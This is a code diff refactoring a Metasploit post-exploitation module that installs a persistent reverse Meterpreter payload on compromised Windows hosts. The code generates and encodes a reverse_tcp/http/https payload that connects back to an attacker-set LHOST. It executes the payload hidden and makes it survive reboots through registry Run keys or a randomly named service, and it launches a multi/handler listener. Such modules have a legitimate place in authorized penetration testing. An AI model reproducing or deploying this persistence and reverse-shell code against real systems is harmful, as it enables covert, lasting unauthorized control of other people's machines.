@@ -22,28 +22,32 @@ class Metasploit3 < Msf::Post
   include Msf::Post::Windows::Services
 
   def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Manage Persistent Payload Installer',
-      'Description'   => %q{
-        This Module will create a boot persistent reverse Meterpreter session by
-        installing on the target host the payload as a script that will be executed
-        at user logon or system startup depending on privilege and selected startup
-        method.
+    super(
+        Msf::Module::ModuleInfo.update!(
+            info,
+            'Name'          => 'Windows Manage Persistent Payload Installer',
+            'Description'   => %q{
+              This Module will create a boot persistent reverse Meterpreter session by
+              installing on the target host the payload as a script that will be executed
+              at user logon or system startup depending on privilege and selected startup
+              method.
 
-        REXE mode will transfer a binary of your choosing to remote host to be
-        used as a payload.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        =>
-        [
-          'Carlos Perez <carlos_perez[at]darkoperator.com>',
-          'Merlyn drforbin Cousins <drforbin6[at]gmail.com>'
-        ],
-      'Platform'      => [ 'win' ],
-      'Actions'       => [['TEMPLATE'], ['REXE']],
-      'DefaultAction' => 'TEMPLATE',
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+              REXE mode will transfer a binary of your choosing to remote host to be
+              used as a payload.
+            },
+            'License'       => MSF_LICENSE,
+            'Arch' => ARCH_X86,
+            'Author'        =>
+                [
+                    'Carlos Perez <carlos_perez[at]darkoperator.com>',
+                    'Merlyn drforbin Cousins <drforbin6[at]gmail.com>'
+                ],
+            'Platform'      => [ 'Windows' ],
+            'Actions'       => [['TEMPLATE'], ['REXE']],
+            'DefaultAction' => 'TEMPLATE',
+            'SessionTypes'  => [ 'meterpreter' ]
+        )
+    )
 
     register_options(
       [
@@ -72,72 +76,71 @@ class Metasploit3 < Msf::Post
     print_status("Running module against #{sysinfo['Computer']}")
 
     # Set vars
-    rexe = datastore['REXE']
-    rexename = datastore['REXENAME']
-    lhost = datastore['LHOST']
-    lport = datastore['LPORT']
-    opts = datastore['OPTIONS']
-    delay = datastore['DELAY']
-    encoder = datastore['ENCODER']
-    iterations = datastore['ITERATIONS']
+    rexe = data_store['REXE']
+    rexename = data_store['REXENAME']
+    lhost = data_store['LHOST']
+    lport = data_store['LPORT']
+    delay = data_store['DELAY']
+    encoder_reference_name = data_store['ENCODER']
+    iterations = data_store['ITERATIONS']
     @clean_up_rc = ""
     host,port = session.session_host, session.session_port
-    payload = "windows/meterpreter/reverse_tcp"
+    payload_reference_name = "windows/meterpreter/reverse_tcp"
 
-    if  datastore['ACTION'] == 'TEMPLATE'
+    if  data_store['ACTION'] == 'TEMPLATE'
       # Check that if a template is provided that it actually exists
-      if datastore['TEMPLATE']
-        if not ::File.exists?(datastore['TEMPLATE'])
+      if data_store['TEMPLATE']
+        if not ::File.exists?(data_store['TEMPLATE'])
           print_error "Template PE File does not exists!"
           return
         else
-          template_pe = datastore['TEMPLATE']
+          template_pe = data_store['TEMPLATE']
         end
       end
 
       # Set the proper payload
-      case datastore['PAYLOAD_TYPE']
+      case data_store['PAYLOAD_TYPE']
       when /TCP/i
-        payload = "windows/meterpreter/reverse_tcp"
+        payload_reference_name = "windows/meterpreter/reverse_tcp"
       when /HTTP/i
-        payload = "windows/meterpreter/reverse_http"
+        payload_reference_name = "windows/meterpreter/reverse_http"
       when /HTTPS/i
-        payload = "windows/meterpreter/reverse_https"
+        payload_reference_name = "windows/meterpreter/reverse_https"
       end
 
       # Create payload and script
-      pay = create_payload(payload, lhost, lport, opts = "")
-      raw = pay_gen(pay,encoder, iterations)
-      script = create_script(delay, template_pe, raw)
+      payload_instance = create_payload(payload_reference_name, lhost, lport)
+      encoded = generate_and_encode_payload(payload_instance, encoder_reference_name, iterations)
+      script = create_script(delay, template_pe, encoded)
       script_on_target = write_script_to_target(script)
     else
-      if datastore['REXE'].nil? or datastore['REXE'].empty?
+      if data_store['REXE'].nil? or data_store['REXE'].empty?
         print_error("Please define REXE")
         return
       end
 
-      if datastore['REXENAME'].nil? or datastore['REXENAME'].empty?
+      if data_store['REXENAME'].nil? or data_store['REXENAME'].empty?
         print_error("Please define REXENAME")
         return
       end
 
-      if not ::File.exist?(datastore['REXE'])
+      if not ::File.exist?(data_store['REXE'])
         print_error("Rexe file does not exist!")
         return
       end
 
-      raw = create_payload_from_file(rexe)
-      script_on_target = write_exe_to_target(raw,rexename)
+      encoded = create_payload_from_file(rexe)
+      script_on_target = write_exe_to_target(encoded,rexename)
     end
 
 
     # Start handler if set
-    create_multihand(payload, lhost, lport) if datastore['HANDLER']
+    create_multihand(payload_reference_name, lhost, lport) if data_store['HANDLER']
 
     # Initial execution of script
     target_exec(script_on_target)
 
-    case datastore['STARTUP']
+    case data_store['STARTUP']
     when /USER/i
       write_to_reg("HKCU",script_on_target)
     when /SYSTEM/i
@@ -165,53 +168,52 @@ class Metasploit3 < Msf::Post
     )
   end
 
-  # Generate raw payload
-  #-------------------------------------------------------------------------------
-  def pay_gen(pay,encoder, iterations)
-    raw = pay.generate
-    if encoder
-      if enc_compat(pay, encoder)
-        print_status("Encoding with #{encoder}")
-        enc = framework.encoders.create(encoder)
+  # Generate encoded payload.
+  #
+  # @param payload_instance [Msf::Payload] a payload to generate and encode.
+  # @param encoder_reference_name [String, nil] `Mdm::Module::Class#reference_name` for encoder that should encode the
+  #   generated payload.
+  # @param iterations [Integer] The number of times to encode the generated payload.
+  # @return [String] the encoded generated payload
+  def generate_and_encode_payload(payload_instance, encoder_reference_name, iterations)
+    encoded = payload_instance.generate
+
+    if encoder_reference_name
+      if encoder_compatible_with_payload?(payload_instance, encoder_reference_name)
+        print_status("Encoding with #{encoder_reference_name}")
+        enc = framework.encoders.create(encoder_reference_name)
+
         (1..iterations).each do |i|
           print_status("\tRunning iteration #{i}")
-          raw = enc.encode(raw, nil, nil, "Windows")
+          encoded = enc.encode(encoded, nil, nil, "Windows")
         end
       end
     end
-    return raw
+
+    encoded
   end
 
-  # Check if encoder specified is in the compatible ones
+  # @note This should allow to adapt to new encoders if they appear with out having to have a static whitelist.
   #
-  # Note: This should allow to adapt to new encoders if they appear with out having
-  # to have a static whitelist.
-  #-------------------------------------------------------------------------------
-  def enc_compat(payload, encoder)
-    compat = false
-    payload.compatible_encoders.each do |e|
-      if e[0] == encoder.strip
-        compat = true
-      end
-    end
-    return compat
+  # Check if `encoder_reference_name` specified is in the compatible encoders for `payload_instance`
+  #
+  # @param payload_instance [Msf::Payload] a payload instance whose encoder compatibility to check.
+  # @return [false] if `encoder_reference_name` is incompatible with `payload_instance`.
+  # @return [true] if `encoder_reference_name` is compatible with `payload_instance`.
+  def encoder_compatible_with_payload?(payload_instance, encoder_reference_name)
+    reference_name = encoder_reference_name.strip
+    payload_instance.compatible_cache_encoder_instances.where(reference_name: reference_name).exists?
   end
 
   # Create a payload given a name, lhost and lport, additional options
   #-------------------------------------------------------------------------------
-  def create_payload(name, lhost, lport, opts = "")
+  def create_payload(name, lhost, lport)
 
     pay = session.framework.payloads.create(name)
-    pay.datastore['LHOST'] = lhost
-    pay.datastore['LPORT'] = lport
-    if not opts.empty?
-      opts.split(",").each do |o|
-        opt,val = o.split("=", 2)
-        pay.datastore[opt] = val
-      end
-    end
+    pay.data_store['LHOST'] = lhost
+    pay.data_store['LPORT'] = lport
     # Validate the options for the module
-    pay.options.validate(pay.datastore)
+    pay.options.validate(pay.data_store)
     return pay
 
   end
@@ -273,8 +275,8 @@ class Metasploit3 < Msf::Post
     client.framework.jobs.each do |k,j|
       if j.name =~ / multi\/handler/
         current_id = j.jid
-        current_lhost = j.ctx[0].datastore["LHOST"]
-        current_lport = j.ctx[0].datastore["LPORT"]
+        current_lhost = j.ctx[0].data_store["LHOST"]
+        current_lport = j.ctx[0].data_store["LPORT"]
         if lhost == current_lhost and lport == current_lport.to_i
           print_error("Job #{current_id} is listening on IP #{current_lhost} and port #{current_lport}")
           conflict = true
@@ -288,22 +290,22 @@ class Metasploit3 < Msf::Post
   #-------------------------------------------------------------------------------
   def create_multihand(payload,lhost,lport)
     pay = session.framework.payloads.create(payload)
-    pay.datastore['LHOST'] = lhost
-    pay.datastore['LPORT'] = lport
+    pay.data_store['LHOST'] = lhost
+    pay.data_store['LPORT'] = lport
     print_status("Starting exploit multi handler")
     if not check_for_listner(lhost,lport)
       # Set options for module
       mul = session.framework.exploits.create("multi/handler")
-      mul.share_datastore(pay.datastore)
-      mul.datastore['WORKSPACE'] = client.workspace
-      mul.datastore['PAYLOAD'] = payload
-      mul.datastore['EXITFUNC'] = 'thread'
-      mul.datastore['ExitOnSession'] = false
+      mul.share_data_store(pay.data_store)
+      mul.data_store['WORKSPACE'] = client.workspace
+      mul.data_store['PAYLOAD'] = payload
+      mul.data_store['EXITFUNC'] = 'thread'
+      mul.data_store['ExitOnSession'] = false
       # Validate module options
-      mul.options.validate(mul.datastore)
+      mul.options.validate(mul.data_store)
       # Execute showing output
       mul.exploit_simple(
-          'Payload'     => mul.datastore['PAYLOAD'],
+          'Payload'     => mul.data_store['PAYLOAD'],
           'LocalInput'  => self.user_input,
           'LocalOutput' => self.user_output,
           'RunAsJob'    => true
@@ -318,7 +320,7 @@ class Metasploit3 < Msf::Post
   #-------------------------------------------------------------------------------
   def target_exec(script_on_target)
     print_status("Executing script #{script_on_target}")
-    proc = datastore['ACTION'] == 'REXE' ? session.sys.process.execute(script_on_target, nil, {'Hidden' => true})\
+    proc = data_store['ACTION'] == 'REXE' ? session.sys.process.execute(script_on_target, nil, {'Hidden' => true})\
     : session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})
 
     print_good("Agent executed with PID #{proc.pid}")
@@ -345,7 +347,7 @@ class Metasploit3 < Msf::Post
       print_status("Installing as service..")
       nam = Rex::Text.rand_text_alpha(rand(8)+8)
       print_status("Creating service #{nam}")
-      datastore['ACTION'] == 'REXE' ? service_create(nam, nam, "cmd /c \"#{script_on_target}\"") : service_create(nam, nam, "cscript \"#{script_on_target}\"")
+      data_store['ACTION'] == 'REXE' ? service_create(nam, nam, "cmd /c \"#{script_on_target}\"") : service_create(nam, nam, "cscript \"#{script_on_target}\"")
 
       @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
     else
